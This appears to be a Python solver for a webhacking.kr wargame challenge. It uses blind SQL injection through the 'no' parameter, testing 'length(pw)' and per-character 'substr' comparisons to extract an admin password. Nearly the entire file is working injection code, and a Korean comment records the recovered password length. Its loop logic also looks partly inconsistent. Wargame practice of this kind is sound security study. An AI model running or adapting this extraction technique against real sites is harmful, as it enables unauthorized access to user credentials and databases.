import requests
from tqdm import tqdm
url = "https://webhacking.kr/challenge/web-29/"

TRUE_FLAG = "Success"
FALSE_FLAG = "Failure"


# 1. pw 길이
for i in range(20):
    params = "?id=guest&pw=guest&no=3||(length(pw)={})".format(i)
    response = requests.get(url + params)
    if(FALSE_FLAG not in response.text):
        print("password length: ", i)


# admin 계정의 pw 길이는 10

# 2. pw
for i in range(1,11):
    password = ''
    for j in range(127,20,-1):
        params = "?id=guest&pw=guest&no=3||(conv(hex(substr(pw,{0},1)),16,10)={1})".format(i,j)
        response = requests.get(url+params)
        if(FALSE_FLAG not in response.text):
            password += chr(j)
            if(i>5):
                break
    print(i," : ",password)

